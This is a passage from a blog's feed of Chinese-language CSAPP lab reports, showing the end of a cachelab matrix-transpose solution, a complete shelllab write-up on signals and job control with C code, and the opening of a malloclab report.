i = x + <span class="number">4</span>; j++)</span><br><span class="line">        {</span><br><span class="line">            <span class="comment">// A左下</span></span><br><span class="line">            <span class="keyword">int</span> tmp0 = A[i][j];</span><br><span class="line">            <span class="keyword">int</span> tmp1 = A[i + <span class="number">1</span>][j];</span><br><span class="line">            <span class="keyword">int</span> tmp2 = A[i + <span class="number">2</span>][j];</span><br><span class="line">            <span class="keyword">int</span> tmp3 = A[i + <span class="number">3</span>][j];</span><br><span class="line">            <span class="comment">// B右上</span></span><br><span class="line">            <span class="keyword">int</span> tmp4 = B[j][i];</span><br><span class="line">            <span class="keyword">int</span> tmp5 = B[j][i + <span class="number">1</span>];</span><br><span class="line">            <span class="keyword">int</span> tmp6 = B[j][i + <span class="number">2</span>];</span><br><span class="line">            <span class="keyword">int</span> tmp7 = B[j][i + <span class="number">3</span>];</span><br><span class="line">            <span class="comment">// A左下写到B右上</span></span><br><span class="line">            B[j][i] = tmp0;</span><br><span class="line">            B[j][i + <span class="number">1</span>] = tmp1;</span><br><span class="line">            B[j][i + <span class="number">2</span>] = tmp2;</span><br><span class="line">            B[j][i + <span class="number">3</span>] = tmp3;</span><br><span class="line">            <span class="comment">// B右上到B左下</span></span><br><span class="line">            B[j + <span class="number">4</span>][i - <span class="number">4</span>] = tmp4;</span><br><span class="line">            B[j + <span class="number">4</span>][i - <span class="number">3</span>] = tmp5;</span><br><span class="line">            B[j + <span class="number">4</span>][i - <span class="number">2</span>] = tmp6;</span><br><span class="line">            B[j + <span class="number">4</span>][i - <span class="number">1</span>] = tmp7;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">for</span> (i = x + <span class="number">4</span>; i &lt; x + <span class="number">8</span>; i++)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">int</span> tmp4 = A[i][y + <span class="number">4</span>];</span><br><span class="line">            <span class="keyword">int</span> tmp5 = A[i][y + <span class="number">5</span>];</span><br><span class="line">            <span class="keyword">int</span> tmp6 = A[i][y + <span class="number">6</span>];</span><br><span class="line">            <span class="keyword">int</span> tmp7 = A[i][y + <span class="number">7</span>];</span><br><span class="line">            B[y + <span class="number">4</span>][i] = tmp4;</span><br><span class="line">            B[y + <span class="number">5</span>][i] = tmp5;</span><br><span class="line">            B[y + <span class="number">6</span>][i] = tmp6;</span><br><span class="line">            B[y + <span class="number">7</span>][i] = tmp7;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>经过测试，miss 数为 1179，满足了要求。</p>
<h3 id="section-1">61*67</h3>
<p>这个的难点在于不规则的形状，使得寄存器优化和子块划分都很困难。但幸运的是，这个题标准不高。使用 8*8 的子块暴力都只有 2118 的 miss，与要求的 2000 已经非常相近。切换成 16*16 的子块后，miss 数变为了 1992，擦线满分。</p>
<h2 id="总结">总结</h2>
<p>毕业答辩通过了！cache 实在是太好玩了！</p>
<h2 id="参考">参考</h2>
<ul>
<li><a href="http://csapp.cs.cmu.edu/2e/waside/waside-blocking.pdf">csapp.cs.cmu.edu/2e/waside/waside-blocking.pdf</a></li>
</ul>
]]></content>
      <categories>
        <category>学习笔记</category>
        <category>体系结构</category>
        <category>csapp</category>
        <category>实验报告</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>体系结构</tag>
        <tag>csapp</tag>
        <tag>实验报告</tag>
      </tags>
  </entry>
  <entry>
    <title>CSAPP-Lab-5 实验报告: shelllab</title>
    <url>/blog/2023/12/21/CSAPP-Lab-5/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>本文介绍了笔者在做 shelllab 一节的实验报告。该 lab 要求使用 C 语言实现一个简易的 shell，加深对异常控制流的理解。
<span id="more"></span></p>
<h2 id="理论知识">理论知识</h2>
<h3 id="异常控制流">异常控制流</h3>
<p>从通电开始到关机结束，CPU 重复地执行着程序寄存器所指向的指令，这些指令的转移关系序列构成了控制流。最简单的控制流就是执行下一条相邻指令。在程序内部，可以通过分支跳转，以及调用返回的机制，改变控制流，执行非相邻的指令。但是，这仅限于程序内部的正常逻辑。</p>
<p>而对于计算机系统，需要一定的机制响应处理外部事件，例如：</p>
<ul>
<li>数据包到达网络适配器</li>
<li>程序执行错误，如除数为 0</li>
<li> 用户按下 ctrl+c</li>
<li> 系统的计时器超时</li>
</ul>
<p>现代系统通过异常控制流（Exception Control
Flow，ECF）的机制来应对这些情况，通过软硬件协作实现。例如，硬件检测到外部事件发生，设置 CPU 中断信号，执行异常处理代码。操作系统层面，通过上下文切换，将控制权移交内核或其他程序。应用层面，可以通过信号机制完成进程通信，使得进程其他进程移交控制到信号处理逻辑，等等。</p>
<h3 id="异常">异常</h3>
<p>异常的流程如下图所示。外部事件的发生，使得程序移交控制权到异常处理程序，处理完毕后，可能会跳转回程序继续执行程序指令。返回地址可以是当前指令（如缺页异常），或者下一条指令（如系统调用），也可能根本不返回（如非法访问）。</p>
<p><img src="ecf.png"></p>
<p>每个异常都有一个唯一非负的异常号，并与一段异常处理程序关联，在操作系统中这构成了一张异常表，如下图所示。</p>
<p><img src="exception_table.png"></p>
<p>异常可以分为以下几种，中断是由 IO 设备引起的异步异常，而陷阱、故障、终止都是同步异常。他们的返回地址也有所差别。</p>
<p><img src="exceptions.png"></p>
<h3 id="信号">信号</h3>
<p>信号（Signal）是一种进程间通信的手段，其思想是，发送预先定义的信号到指定进程，触发进程的信号处理逻辑。常见的信号有：</p>
<table>
<thead>
<tr class="header">
<th>编号</th>
<th>名称</th>
<th>默认动作</th>
<th>对应事件</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td> 2</td>
<td>SIGINT</td>
<td> 终止</td>
<td>用户输入 ctrl+c</td>
</tr>
<tr class="even">
<td>9</td>
<td>SIGKILL</td>
<td> 终止</td>
<td>终止程序（不能重写或忽略）</td>
</tr>
<tr class="odd">
<td>11</td>
<td>SIGSEGV</td>
<td> 终止且 Dump</td>
<td> 段冲突 Segmentation violation</td>
</tr>
<tr class="even">
<td>14</td>
<td>SIGALRM</td>
<td> 终止</td>
<td>时间信号</td>
</tr>
<tr class="odd">
<td> 17</td>
<td>SIGCHLD</td>
<td> 忽略</td>
<td>子进程停止或终止</td>
</tr>
</tbody>
</table>
<p>信号的实现机制为，每个进程内部维护一个 bitset 表示待处理的信号，使用 <code>kill</code> 命令向进程 A 发送信号后，实际是将进程 A 的对应信号 bit 置 1。当进程 A 被操作系统调度执行前，会先检查是否有待处理的信号，如有则跳转到信号的处理逻辑，每种信号有默认的处理行为，程序内部可以通过重写函数改变行为。SIGKILL 信号无法被重写，保证了恶意程序一定可以杀掉。</p>
<p>信号虽然很方便，但也带来了一些问题。根本上看，信号处理与用户程序是并发的，这意味着可能出现竞态条件、死锁这些并发问题。而且，信号的处理可以被新的信号打断。课程中给出了一些建议，来编写好的信号处理函数：</p>
<ul>
<li>规则 1：信号处理器越简单越好
<ul>
<li>例如：设置一个全局的标记，并返回</li>
</ul></li>
<li>规则 2：信号处理器中只调用异步且信号安全 (async-signal-safe) 的函数
<ul>
<li>诸如 <code>printf</code>, <code>sprintf</code>, <code>malloc</code>
和 <code>exit</code> 都是不安全的！</li>
</ul></li>
<li>规则 3：在进入和退出的时候保存和恢复 <code>errno</code>
<ul>
<li>这样信号处理器就不会覆盖原有的 <code>errno</code> 值</li>
</ul></li>
<li>规则 4：临时阻塞所有的信号以保证对于共享数据结构的访问
<ul>
<li>防止可能出现的数据损坏</li>
</ul></li>
<li>规则 5：用 <code>volatile</code> 关键字声明全局变量
<ul>
<li>这样编译器就不会把它们保存在寄存器中，保证一致性</li>
</ul></li>
<li>规则 6：用 <code>volatile sig_atomic_t</code> 来声明全局标识符 (flag)
<ul>
<li>这样可以防止出现访问异常</li>
</ul></li>
</ul>
<h2 id="实验概览">实验概览</h2>
<p>实验部分要求我们实现一个 <code>tsh</code>，支持内置的作业管理，需要实现以下函数：</p>
<ul>
<li>eval：shell 主进程，解析并执行命令行输入</li>
<li> builtin_cmd：识别命令是否为内置命令，bg、fg、jobs、quit</li>
<li>do_bgfg: 实现 bg 和 fg 命令</li>
<li> waitfg：等待前台作业结束</li>
<li> sigchld_handler：SIGCHLD 信号的处理</li>
<li> sigint_handler: SIGINT 信号处理（ctrl+c）</li>
<li>sigtstp_handler: SIGSTP 信号处理（ctrl+z）</li>
</ul>
<p>代码的逻辑非常清晰，在 <code>main</code> 中，解析命令行参数，注册信号处理函数，初始化作业数组，接着就进入一个死循环，接受命令行输入，<code>eval</code> 执行，还有注释可以帮助理解。接下来，我们可以由易到难地逐个实现这些函数。</p>
<p>在实现之前，可以将其他 lab 里的 <code>csapp.c</code> 的包装代码复制过来，以大写字母开头的系统调用函数。这些函数在内部封装了错误处理的逻辑，代码风格更好。</p>
<h2 id="builtin_cmd">builtin_cmd</h2>
<p>判断命令是否为 bg、fg、jobs、quit 之一，可以通过 <code>strcmp</code> 函数实现，非常直接简单。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> *QUIT_CMD = <span class="string">"quit"</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> *FG_CMD = <span class="string">"fg"</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> *BG_CMD = <span class="string">"bg"</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> *JOBS_CMD = <span class="string">"jobs"</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * builtin_cmd - If the user has typed a built-in command then execute</span></span><br><span class="line"><span class="comment"> *    it immediately.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">builtin_cmd</span><span class="params">(<span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">if</span> (argv == <span class="literal">NULL</span> || argv[<span class="number">0</span>] == <span class="literal">NULL</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], QUIT_CMD) == <span class="number">0</span> || <span class="built_in">strcmp</span>(argv[<span class="number">0</span>], FG_CMD) == <span class="number">0</span> || <span class="built_in">strcmp</span>(argv[<span class="number">0</span>], BG_CMD) == <span class="number">0</span> || <span class="built_in">strcmp</span>(argv[<span class="number">0</span>], JOBS_CMD) == <span class="number">0</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">/* not a builtin command */</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h2 id="waitfg">waitfg</h2>
<p>等待前台作业结束。核心是使用一个 <code>while</code> 循环反复重试，直到该作业不是前台作业，循环内可以使用 <code>sleep</code>，如下所示：</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * waitfg - Block until process pid is no longer the foreground process</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">waitfg</span><span class="params">(<span class="keyword">pid_t</span> pid)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> *<span class="title">job</span> =</span> getjobpid(jobs, pid);</span><br><span class="line">    <span class="keyword">if</span> (job == <span class="literal">NULL</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">while</span> (job-&gt;state == FG)</span><br><span class="line">    {</span><br><span class="line">        Sleep(<span class="number">1</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>也可以按课上所说，使用 <code>sigsuspend</code> 调用来阻塞等待，等价于原子执行以下三行代码。其中 <code>pause</code> 函数用以阻塞直到接收到信号，可以避免上述忙等待的重试。<code>pause</code> 前屏蔽信号，又避免了在 <code>pause</code> 前收到信号，<code>pause</code> 无限等待的死锁。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line">sigprocmask(SIG_BLOCK, &amp;mask, &amp;prev);</span><br><span class="line">pause();</span><br><span class="line">sigprocmask(SIG_SETMASK, &amp;prev, <span class="literal">NULL</span>);</span><br></pre></td></tr></tbody></table></figure>
<p>使用 <code>sigsuspend</code> 的版本如下所示：</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">waitfg</span><span class="params">(<span class="keyword">pid_t</span> pid)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> *<span class="title">job</span> =</span> getjobpid(jobs, pid);</span><br><span class="line">    <span class="keyword">if</span> (job == <span class="literal">NULL</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">sigset_t</span> mask, prev;</span><br><span class="line">    Sigemptyset(&amp;mask);</span><br><span class="line">    Sigaddset(&amp;mask, SIGCHLD);</span><br><span class="line">    Sigprocmask(SIG_BLOCK, &amp;mask, &amp;prev);</span><br><span class="line">    <span class="keyword">while</span> (job-&gt;state == FG)</span><br><span class="line">    {</span><br><span class="line">        sigsuspend(&amp;prev);</span><br><span class="line">    }</span><br><span class="line">    Sigprocmask(SIG_SETMASK, &amp;prev, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>它的思想是，先屏蔽掉 SIGCHLD 信号，当发现作业依然是前台作业时，原子性执行以下逻辑：</p>
<ol type="1">
<li>取消 SIGCHLD 信号屏蔽</li>
<li>阻塞直到某个信号出现</li>
<li>屏蔽 SIGCHLD 信号</li>
</ol>
<p>然后，判断作业是否依然为前台作业，决定是否继续循环等待。相较于 <code>sleep</code>，这个版本更加高效。</p>
<h2 id="eval">eval</h2>
<p>解析命令行参数并执行。对于内置命令，直接在 shell 进程中执行，否则，通过 <code>fork,execve</code> 结合在子进程中执行。对于子进程，需要：</p>
<ul>
<li>通过 <code>addjob</code> 将它添加到作业中，用于管理</li>
<li>设置子进程的 groupid 为单独的 pid，避免与 tsh 共用 groupid 时，杀掉子进程组把 tsh 也杀掉</li>
<li>如果为前台作业，等待结束，如果为后台作业，打印命令行（与标准程序达到一致输出）</li>
</ul>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">eval</span><span class="params">(<span class="keyword">char</span> *cmdline)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="comment">// printf("eval %s\n", cmdline);</span></span><br><span class="line">    <span class="keyword">char</span> **argv = (<span class="keyword">char</span> **)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span> *) * MAXARGS);</span><br><span class="line">    <span class="keyword">int</span> bg = parseline(cmdline, argv);</span><br><span class="line">    <span class="keyword">if</span> (argv[<span class="number">0</span>] == <span class="literal">NULL</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">// 立刻执行内置命令</span></span><br><span class="line">    <span class="keyword">if</span> (builtin_cmd(argv))</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], JOBS_CMD) == <span class="number">0</span>)</span><br><span class="line">        {</span><br><span class="line">            listjobs(jobs);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], QUIT_CMD) == <span class="number">0</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        {</span><br><span class="line">            do_bgfg(argv);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">sigset_t</span> mask_all, mask_one, prev_one;</span><br><span class="line">    Sigfillset(&amp;mask_all);</span><br><span class="line">    Sigemptyset(&amp;mask_one);</span><br><span class="line">    Sigaddset(&amp;mask_one, SIGCHLD);</span><br><span class="line">    <span class="comment">// fork 子进程执行程序</span></span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    <span class="comment">// 父进程屏蔽sigchld</span></span><br><span class="line">    Sigprocmask(SIG_BLOCK, &amp;mask_one, &amp;prev_one);</span><br><span class="line">    <span class="keyword">if</span> ((pid = Fork()) == <span class="number">0</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="comment">// 子进程接收sigchld</span></span><br><span class="line">        Sigprocmask(SIG_SETMASK, &amp;prev_one, <span class="literal">NULL</span>);</span><br><span class="line">        pid = getpid();</span><br><span class="line">        Setpgid(pid, pid);</span><br><span class="line">        Execve(argv[<span class="number">0</span>], argv, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="comment">// 兜底异常退出</span></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    }</span><br><span class="line">    Sigprocmask(SIG_BLOCK, &amp;mask_all, <span class="literal">NULL</span>);</span><br><span class="line">    addjob(jobs, pid, bg ? BG : FG, cmdline);</span><br><span class="line">    <span class="keyword">if</span> (bg)</span><br><span class="line">    {</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> *<span class="title">job</span> =</span> getjobpid(jobs, pid);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[%d] (%d) %s"</span>, job-&gt;jid, job-&gt;pid, job-&gt;cmdline);</span><br><span class="line">        Sigprocmask(SIG_SETMASK, &amp;prev_one, <span class="literal">NULL</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">        Sigprocmask(SIG_SETMASK, &amp;prev_one, <span class="literal">NULL</span>);</span><br><span class="line">        waitfg(pid);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>值得注意的事，在 <code>Fork</code> 前，父进程中屏蔽了 SIGCHLD 信号，这是为了避免出现子进程先结束（SIGCHLD 信号处理中调用 <code>deletejob</code>），再 <code>addjob</code> 的情况。这种情况下就使得作业管理出错。父进程中，在 <code>Fork</code> 之前就屏蔽了 SIGCHLD 信号，在 <code>addjob</code> 之后才恢复，就确保了作业被成功添加之后才可以被删除。<code>addjob</code> 前屏蔽所有信号，是为了避免 <code>printf</code> 并发冲突。</p>
<p>在子进程中，初始继承了父进程对于 SIGCHLD 的屏蔽，需要提前解除，避免子进程无法响应 SIGCHLD。</p>
<h2 id="do_bgfg">do_bgfg</h2>
<p>这个函数本身功能很简单，解析 jobid/pid，向<strong>进程组</strong>发送 SIGCONT 信号即可。但是 trace14 中测试了大量的边界情况，需要做参数校验，例如 pid 不存在时报错，pid 格式非法等。要健壮地判断边界代码量还是很大的，这里讨了个巧。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_bgfg</span><span class="params">(<span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> *<span class="title">job</span>;</span></span><br><span class="line">    <span class="comment">// 参数校验</span></span><br><span class="line">    <span class="keyword">if</span> (argv[<span class="number">1</span>] == <span class="literal">NULL</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s command requires PID or %%jobid argument\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argv[<span class="number">1</span>][<span class="number">0</span>] == <span class="string">'%'</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">isdigit</span>(argv[<span class="number">1</span>][<span class="number">1</span>]))</span><br><span class="line">        {</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%s: argument must be a PID or %%jobid\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">pid_t</span> jid = atoi(argv[<span class="number">1</span>] + <span class="number">1</span>);</span><br><span class="line">        job = getjobjid(jobs, jid);</span><br><span class="line">        <span class="keyword">if</span> (job == <span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%s: No such job\n"</span>, argv[<span class="number">1</span>]);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">isdigit</span>(argv[<span class="number">1</span>][<span class="number">0</span>]))</span><br><span class="line">        {</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%s: argument must be a PID or %%jobid\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">pid_t</span> pid = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">        job = getjobpid(jobs, pid);</span><br><span class="line">        <span class="keyword">if</span> (job == <span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"(%s): No such process\n"</span>, argv[<span class="number">1</span>]);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], BG_CMD) == <span class="number">0</span>)</span><br><span class="line">    {</span><br><span class="line">        job-&gt;state = BG;</span><br><span class="line">        Kill(-job-&gt;pid, SIGCONT);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[%d] (%d) %s"</span>, job-&gt;jid, job-&gt;pid, job-&gt;cmdline);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">        job-&gt;state = FG;</span><br><span class="line">        Kill(-job-&gt;pid, SIGCONT);</span><br><span class="line">        waitfg(job-&gt;pid);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<h2 id="sigchld_handler">sigchld_handler</h2>
<p>SIGCHLD 信号的处理。当子进程终止 / 被挂起时，会发送 SIGCHLD 给父进程。在父进程中，需要通过 <code>wait/waitpid</code> 回收已经结束的僵尸进程，避免空间浪费。这里不能无限地阻塞等待，会导致死锁。代码如下：</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigchld_handler</span><span class="params">(<span class="keyword">int</span> sig)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> olderrno = errno;</span><br><span class="line">    <span class="keyword">sigset_t</span> mask_all, prev_all;</span><br><span class="line">    Sigfillset(&amp;mask_all);</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    <span class="keyword">int</span> status;</span><br><span class="line">    <span class="keyword">while</span> ((pid = waitpid(<span class="number">-1</span>, &amp;status, WNOHANG | WUNTRACED)) &gt; <span class="number">0</span>)</span><br><span class="line">    {</span><br><span class="line">        Sigprocmask(SIG_BLOCK, &amp;mask_all, &amp;prev_all);</span><br><span class="line">        <span class="comment">// 正常终止, 回收</span></span><br><span class="line">        <span class="keyword">if</span> (WIFEXITED(status))</span><br><span class="line">        {</span><br><span class="line">            deletejob(jobs, pid);</span><br><span class="line">        }</span><br><span class="line">        <span class="comment">// 异常终止</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (WIFSIGNALED(status))</span><br><span class="line">        {</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Job [%d] (%d) terminated by signal %d \n"</span>, pid2jid(pid), pid, WTERMSIG(status));</span><br><span class="line">            deletejob(jobs, pid);</span><br><span class="line">        }</span><br><span class="line">        <span class="comment">// 暂停挂起</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (WIFSTOPPED(status))</span><br><span class="line">        {</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Job [%d] (%d) stopped by signal %d \n"</span>, pid2jid(pid), pid, WSTOPSIG(status));</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> *<span class="title">job</span> =</span> getjobpid(jobs, pid);</span><br><span class="line">            job-&gt;state = ST;</span><br><span class="line">        }</span><br><span class="line">        Sigprocmask(SIG_SETMASK, &amp;prev_all, <span class="literal">NULL</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> (pid != <span class="number">0</span> &amp;&amp; errno != ECHILD)</span><br><span class="line">    {</span><br><span class="line">        Sio_error(<span class="string">"waitpid error"</span>);</span><br><span class="line">    }</span><br><span class="line">    errno = olderrno;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>其中，<code>WIFEXITED,WIFSIGNALED,WIFSTOPPED</code> 是定义在 <code>&lt;stdlib.h&gt;</code> 中的宏函数，用于判断子进程的结束原因，<code>WTERMSIG,WSTOPSIG</code> 用于获取对应的 signal。<code>WNOHANG,WUNTRACED</code> 两个 option 要求 waitpid 在没有结束子进程时立刻返回，有挂起子进程时也返回，这样就能够捕获到这些事件进行响应。核心的处理逻辑也屏蔽了其他信号，避免被打断。</p>
<h2 id="sigint_handler">sigint_handler</h2>
<p>将信号转发给前台进程组即可。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigint_handler</span><span class="params">(<span class="keyword">int</span> sig)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> olderrno = errno;</span><br><span class="line">    <span class="keyword">sigset_t</span> mask_all, prev_all;</span><br><span class="line">    Sigfillset(&amp;mask_all);</span><br><span class="line">    Sigprocmask(SIG_BLOCK, &amp;mask_all, &amp;prev_all);</span><br><span class="line">    <span class="keyword">pid_t</span> pid = fgpid(jobs);</span><br><span class="line">    <span class="keyword">if</span> (pid)</span><br><span class="line">    {</span><br><span class="line">        Kill(-pid, SIGINT);</span><br><span class="line">    }</span><br><span class="line">    Sigprocmask(SIG_SETMASK, &amp;prev_all, <span class="literal">NULL</span>);</span><br><span class="line">    errno = olderrno;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h2 id="sigtstp_handler">sigtstp_handler</h2>
<p>将信号转发给前台进程组即可。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigtstp_handler</span><span class="params">(<span class="keyword">int</span> sig)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> olderrno = errno;</span><br><span class="line">    <span class="keyword">sigset_t</span> mask_all, prev_all;</span><br><span class="line">    Sigfillset(&amp;mask_all);</span><br><span class="line">    Sigprocmask(SIG_BLOCK, &amp;mask_all, &amp;prev_all);</span><br><span class="line">    <span class="keyword">pid_t</span> pid = fgpid(jobs);</span><br><span class="line">    <span class="keyword">if</span> (pid)</span><br><span class="line">    {</span><br><span class="line">        Kill(-pid, SIGSTOP);</span><br><span class="line">    }</span><br><span class="line">    Sigprocmask(SIG_SETMASK, &amp;prev_all, <span class="literal">NULL</span>);</span><br><span class="line">    errno = olderrno;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h2 id="参考">参考</h2>
<ul>
<li><a href="https://wdxtub.com/csapp/thin-csapp-5/2016/04/16/">【读薄
CSAPP】伍 异常控制流 | 小土刀 2.0 (wdxtub.com)</a></li>
</ul>
]]></content>
      <categories>
        <category>学习笔记</category>
        <category>体系结构</category>
        <category>csapp</category>
        <category>实验报告</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>体系结构</tag>
        <tag>csapp</tag>
        <tag>实验报告</tag>
      </tags>
  </entry>
  <entry>
    <title>CSAPP-Lab-6 实验报告: malloclab</title>
    <url>/blog/2023/12/29/CSAPP-Lab-6/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>本文介绍了笔者在做 malloclab 一节的实验报告。该 lab 要求使用 C 语言实现动态内存管理功能，即 <code>malloc,free,realloc</code> 三个函数，完成堆上内存的申请与释放。</p>
<span id="more"></span>
<h2 id="理论知识">理论知识</h2>
<h3 id="动态内存管理">动态内存管理</h3>
<p>在程序虚拟内存空间中，栈是由编译器维护的、用于存放局部变量的区域。栈的空间受限，不能用于存储大型对象（linux
